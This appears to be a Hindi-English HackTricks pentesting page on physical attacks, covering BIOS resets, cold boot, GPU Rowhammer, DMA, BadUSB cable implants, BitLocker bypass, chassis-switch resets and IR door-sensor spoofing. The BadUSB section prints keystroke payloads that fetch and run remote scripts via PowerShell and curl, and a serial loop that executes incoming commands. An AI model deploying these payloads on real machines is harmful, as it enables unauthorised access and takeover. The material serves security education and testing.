# Physical Attacks

{{#include ../banners/hacktricks-training.md}}

## BIOS Password Recovery and System Security

**BIOS** को reset करना कई तरीकों से किया जा सकता है। अधिकांश motherboards में एक **battery** होती है, जिसे लगभग **30 minutes** के लिए निकाल देने पर BIOS settings, including the password, reset हो जाती हैं। वैकल्पिक रूप से, **motherboard पर एक jumper** को specific pins को connect करके इन settings को reset करने के लिए adjust किया जा सकता है।

ऐसी स्थितियों में जहाँ hardware adjustments संभव या practical नहीं हैं, **software tools** एक solution देते हैं। **Kali Linux** जैसी distributions के साथ **Live CD/USB** से system चलाने पर **_killCmos_** और **_CmosPWD_** जैसे tools तक access मिलता है, जो BIOS password recovery में मदद कर सकते हैं।

जब BIOS password unknown हो, तो उसे **तीन बार** गलत enter करने पर आमतौर पर एक error code मिलता है। इस code का उपयोग [https://bios-pw.org](https://bios-pw.org) जैसी websites पर करके संभावित रूप से एक usable password प्राप्त किया जा सकता है।

### UEFI Security

**UEFI** का उपयोग करने वाले modern systems के लिए, traditional BIOS के बजाय, **chipsec** tool का उपयोग UEFI settings का analysis और modification करने के लिए किया जा सकता है, including **Secure Boot** को disable करना। यह निम्न command के साथ किया जा सकता है:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM विश्लेषण और Cold Boot Attacks

RAM बिजली कटने के बाद थोड़े समय तक डेटा बनाए रखती है, आमतौर पर **1 से 2 मिनट** तक। यह स्थायित्व **10 मिनट** तक बढ़ाया जा सकता है यदि liquid nitrogen जैसे ठंडे पदार्थ लगाए जाएँ। इस बढ़े हुए समय में, **dd.exe** और **volatility** जैसे tools का उपयोग करके विश्लेषण के लिए एक **memory dump** बनाया जा सकता है।

---

## Page Tables के विरुद्ध GPU Rowhammer

आधुनिक GPU Rowhammer attacks तब बहुत अधिक उपयोगी हो जाते हैं जब वे साधारण buffers के बजाय **GPU virtual-memory metadata** को target करते हैं। **GDDR6 NVIDIA Ampere GPUs** पर हालिया काम दिखाता है कि unprivileged CUDA code चलाने वाला attacker GPU-specific hammering patterns बना सकता है, **memory massaging** का उपयोग करके paging structures को vulnerable rows में रख सकता है, और फिर **last-level page table** या एक intermediate **page directory** में bits flip कर सकता है। जैसे ही एक single translation entry corrupt होती है, attacker **arbitrary GPU memory read/write** को bootstrap कर सकता है और फिर host compromise की ओर pivot कर सकता है।

### Exploitation Pattern

1. GDDR6 में **hammerable rows** को profile करें और refresh-aware / non-uniform hammering patterns बनाएं जो in-DRAM mitigations को bypass करें।
2. GPU allocations को **massage** करें ताकि driver page-translation structures को default protected pool में रखने के बजाय hammerable physical locations पर रखे। व्यवहार में इसका मतलब low-memory page-table region को exhaust करना और controlled strides के साथ large sparse UVM mappings spray करना हो सकता है।
3. **PFN** या aperture-related bits जैसी translation metadata को किसी page-table / page-directory entry के अंदर flip करें ताकि attacker-controlled virtual page page-table pages, arbitrary GPU memory, या host-visible system mappings पर resolve हो।
4. forged mapping का reuse करके अतिरिक्त translation entries rewrite करें और GPU contexts के across **arbitrary GPU memory read/write** तक escalate करें।

### Host Pivot और Mitigations

- **IOMMU disabled** होने पर, forged system-aperture mappings arbitrary **host physical memory** को GPU के सामने expose कर सकती हैं, जिससे GPU primitive पूर्ण host compromise में बदल जाता है।
- **GDDRHammer** last-level page-table entries को target करता है, जबकि **GeForge** दिखाता है कि page-directory level को corrupt करना आसान हो सकता है क्योंकि एक bit flip बड़े translation subtree को retarget कर सकता है। केवल एक paging layer को security-critical न मानें।
- **IOMMU** फिर भी महत्वपूर्ण है क्योंकि यह GDDRHammer/GeForge द्वारा उपयोग किए गए direct arbitrary-host-memory path को block करता है, लेकिन यह **complete mitigation नहीं** है। **GPUBreach** एक second-stage pivot दिखाता है जहाँ attacker GPU-writable, driver-owned CPU buffers को corrupt करता है और फिर NVIDIA driver memory-safety bugs trigger करके kernel write primitive और **root shell** प्राप्त करता है, भले ही IOMMU enabled हो।
- Supported workstation/server GPUs पर **System-level ECC** एक practical hardening step है। ECC के बिना consumer GPUs एक weaker defense surface expose करते हैं।
- ये attacks केवल theoretical नहीं हैं: **GeForge** ने RTX 3060 पर **1,171** bit flips और RTX A6000 पर **202** reported किए, जो working host-privilege-escalation chain बनाने के लिए पर्याप्त था।

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** एक tool है जिसे DMA के through **physical memory manipulation** के लिए design किया गया है, और यह **FireWire** तथा **Thunderbolt** जैसे interfaces के साथ compatible है। यह memory को patch करके किसी भी password को accept कराने के द्वारा login procedures को bypass करने देता है। हालांकि, यह **Windows 10** systems के खिलाफ ineffective है।

---

## System Access के लिए Live CD/USB

**_sethc.exe_** या **_Utilman.exe_** जैसे system binaries को **_cmd.exe_** की copy से बदलने पर system privileges के साथ command prompt मिल सकता है। **chntpw** जैसे tools का उपयोग Windows installation की **SAM** file को edit करने के लिए किया जा सकता है, जिससे password changes संभव होते हैं।

**Kon-Boot** एक tool है जो Windows kernel या UEFI को temporarily modify करके password जाने बिना Windows systems में login करने में मदद करता है। अधिक जानकारी [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) पर मिल सकती है।

---

## Windows Security Features को संभालना

### Boot और Recovery Shortcuts

- **Supr**: BIOS settings तक पहुँचें।
- **F8**: Recovery mode में जाएँ।
- Windows banner के बाद **Shift** दबाने से autologon bypass हो सकता है।

### BAD USB Devices

**Rubber Ducky** और **Teensyduino** जैसे devices **bad USB** devices बनाने के लिए platforms के रूप में काम करते हैं, जो target computer से जुड़ने पर predefined payloads execute कर सकते हैं।

### Volume Shadow Copy

Administrator privileges **SAM** file सहित sensitive files की copies बनाने की अनुमति देते हैं, वह भी PowerShell के through।

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- ESP32-S3 based implants जैसे **Evil Crow Cable Wind** USB-A→USB-C या USB-C↔USB-C cables के अंदर छिपते हैं, केवल USB keyboard के रूप में enumerate होते हैं, और अपना C2 stack Wi-Fi के over expose करते हैं। operator को केवल victim host से cable को power देना होता है, `Evil Crow Cable Wind` नाम का hotspot पासवर्ड `123456789` के साथ बनाना होता है, और embedded HTTP interface तक पहुँचने के लिए [http://cable-wind.local/](http://cable-wind.local/) (या उसके DHCP address) को browse करना होता है।
- browser UI *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, और *Config* के लिए tabs प्रदान करता है। stored payloads OS के अनुसार tagged होते हैं, keyboard layouts on the fly switch किए जाते हैं, और VID/PID strings को known peripherals की नकल करने के लिए बदला जा सकता है।
- क्योंकि C2 cable के अंदर ही रहता है, एक phone payloads stage कर सकता है, execution trigger कर सकता है, और Wi-Fi credentials manage कर सकता है, host OS को छुए बिना—short dwell-time physical intrusions के लिए ideal।

### OS-aware AutoExec payloads

- AutoExec rules USB enumeration के तुरंत बाद एक या अधिक payloads को fire होने के लिए bind करती हैं। implant हल्का OS fingerprinting करता है और matching script चुनता है।
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) या `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- क्योंकि execution unattended होती है, केवल charging cable बदलने से logged-on user context के under “plug-and-pwn” initial access हासिल किया जा सकता है।

### Wi-Fi TCP के over HID-bootstrapped remote shell

1. **Keystroke bootstrap:** एक stored payload console खोलता है और एक loop paste करता है जो नए USB serial device पर आने वाली किसी भी चीज़ को execute करता है। एक minimal Windows variant है:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant USB CDC चैनल को खुला रखता है, जबकि इसका ESP32-S3 ऑपरेटर की ओर TCP client (Python script, Android APK, या desktop executable) लॉन्च करता है। TCP session में टाइप किए गए किसी भी bytes को ऊपर वाले serial loop में forward किया जाता है, जिससे air-gapped hosts पर भी remote command execution मिलती है। Output सीमित होता है, इसलिए operators आमतौर पर blind commands (account creation, staging additional tooling, etc.) चलाते हैं।

### HTTP OTA update surface

- वही web stack आमतौर पर unauthenticated firmware updates भी expose करता है। Evil Crow Cable Wind `/update` पर listen करता है और जो भी binary upload किया जाता है उसे flash करता है:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Field operators can hot-swap features (e.g., flash USB Army Knife firmware) mid-engagement without opening the cable, letting the implant pivot to new capabilities while still plugged into the target host.

## BitLocker एन्क्रिप्शन को बायपास करना

BitLocker encryption को संभावित रूप से बायपास किया जा सकता है अगर **recovery password** किसी memory dump file (**MEMORY.DMP**) में मिल जाए। इस उद्देश्य के लिए **Elcomsoft Forensic Disk Decryptor** या **Passware Kit Forensic** जैसे tools का उपयोग किया जा सकता है।

---

## Recovery Key जोड़ने के लिए Social Engineering

Social engineering tactics के जरिए एक नया BitLocker recovery key जोड़ा जा सकता है, जिसमें user को ऐसा command execute करने के लिए राज़ी किया जाता है जो zeros से बना नया recovery key जोड़ता है, जिससे decryption process आसान हो जाती है।

---

## BIOS को Factory-Reset करने के लिए Chassis Intrusion / Maintenance Switches का Exploitation

कई modern laptops और small-form-factor desktops में एक **chassis-intrusion switch** होता है जिसे Embedded Controller (EC) और BIOS/UEFI firmware द्वारा monitored किया जाता है। switch का primary purpose यह होता है कि device खुलने पर alert raise हो, लेकिन vendors कभी-कभी एक **undocumented recovery shortcut** implement करते हैं जो switch को specific pattern में toggle करने पर trigger होता है।

### Attack कैसे काम करता है

1. switch को EC पर एक **GPIO interrupt** से wired किया जाता है।
2. EC पर चलने वाला firmware **presses के timing और number** को track करता है।
3. जब hard-coded pattern recognise हो जाता है, तो EC एक *mainboard-reset* routine invoke करता है जो **system NVRAM/CMOS की contents को erase** कर देता है।
4. अगले boot पर BIOS default values load करता है – **supervisor password, Secure Boot keys, और सभी custom configuration clear हो जाते हैं**।

> एक बार जब Secure Boot disabled हो जाता है और firmware password चला जाता है, attacker बस कोई भी external OS image boot कर सकता है और internal drives तक unrestricted access प्राप्त कर सकता है।

### Real-World Example – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen) के लिए recovery shortcut है:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
दसवें cycle के बाद EC एक flag सेट करता है जो BIOS को अगले reboot पर NVRAM wipe करने का निर्देश देता है। पूरी प्रक्रिया में ~40 s लगते हैं और इसमें **सिर्फ एक screwdriver** चाहिए।

### Generic Exploitation Procedure

1. target को power-on करें या suspend-resume करें ताकि EC चल रहा हो।
2. bottom cover हटाकर intrusion/maintenance switch को expose करें।
3. vendor-specific toggle pattern reproduce करें (documentation, forums देखें, या EC firmware reverse-engineer करें)।
4. re-assemble करें और reboot करें – firmware protections disabled होनी चाहिए।
5. live USB (e.g. Kali Linux) boot करें और usual post-exploitation करें (credential dumping, data exfiltration, malicious EFI binaries implant करना, आदि)।

### Detection & Mitigation

* OS management console में chassis-intrusion events log करें और उन्हें unexpected BIOS resets के साथ correlate करें।
* opening detect करने के लिए screws/covers पर **tamper-evident seals** का उपयोग करें।
* devices को **physically controlled areas** में रखें; मान लें कि physical access का मतलब full compromise है।
* जहाँ उपलब्ध हो, vendor “maintenance switch reset” feature disable करें या NVRAM resets के लिए अतिरिक्त cryptographic authorisation आवश्यक करें।

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors एक near-IR LED emitter को TV-remote style receiver module के साथ pair करते हैं, जो तभी logic high report करता है जब उसने correct carrier के multiple pulses (~4–10) देख लिए हों (≈30 kHz)।
- एक plastic shroud emitter और receiver को सीधे एक-दूसरे को देखने से रोकता है, इसलिए controller मानता है कि कोई validated carrier पास की reflection से आया है और एक relay drive करता है जो door strike खोलता है।
- एक बार controller को लगे कि target present है, वह अक्सर outbound modulation envelope बदल देता है, लेकिन receiver अभी भी कोई भी burst accept करता रहता है जो filtered carrier से match करता है।

### Attack Workflow
1. **emission profile capture करें** – controller pins के across एक logic analyser clip करें ताकि internal IR LED को drive करने वाली pre-detection और post-detection दोनों waveforms record हों।
2. सिर्फ “post-detection” waveform replay करें – stock emitter को remove/ignore करें और external IR LED को शुरुआत से ही already-triggered pattern से drive करें। क्योंकि receiver केवल pulse count/frequency की परवाह करता है, वह spoofed carrier को genuine reflection मानता है और relay line assert करता है।
3. **transmission gate करें** – carrier को tuned bursts में transmit करें (e.g., tens of milliseconds on, similar off) ताकि minimum pulse count deliver हो सके बिना receiver की AGC या interference handling logic को saturate किए। Continuous emission sensor को जल्दी desensitise कर देती है और relay firing रोक देती है।

### Long-Range Reflective Injection
- bench LED को high-power IR diode, MOSFET driver, और focusing optics से replace करने पर लगभग ~6 m दूर से reliable triggering संभव हो जाता है।
- attacker को receiver aperture के line-of-sight की आवश्यकता नहीं होती; beam को interior walls, shelving, या glass के through visible door frames पर aim करने से reflected energy ~30° field of view में प्रवेश कर सकती है और close-range hand wave की mimic कर सकती है।
- क्योंकि receivers सिर्फ weak reflections की उम्मीद करते हैं, बहुत stronger external beam multiple surfaces से bounce होकर भी detection threshold से ऊपर रह सकता है।

### Weaponised Attack Torch
- driver को commercial flashlight के अंदर embed करने से tool plain sight में छिप जाता है। visible LED को receiver’s band के matched high-power IR LED से swap करें, ≈30 kHz bursts generate करने के लिए ATtiny412 (या similar) add करें, और LED current sink करने के लिए MOSFET का उपयोग करें।
- telescopic zoom lens range/precision के लिए beam को tighten करता है, जबकि MCU control के तहत vibration motor haptic confirmation देता है कि modulation active है बिना visible light emit किए।
- कई stored modulation patterns (थोड़ी अलग carrier frequencies और envelopes) से cycling करने पर rebranded sensor families के बीच compatibility बढ़ती है, जिससे operator reflective surfaces sweep कर सकता है जब तक relay audibly click न करे और door release न हो जाए।

---

## References

- [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
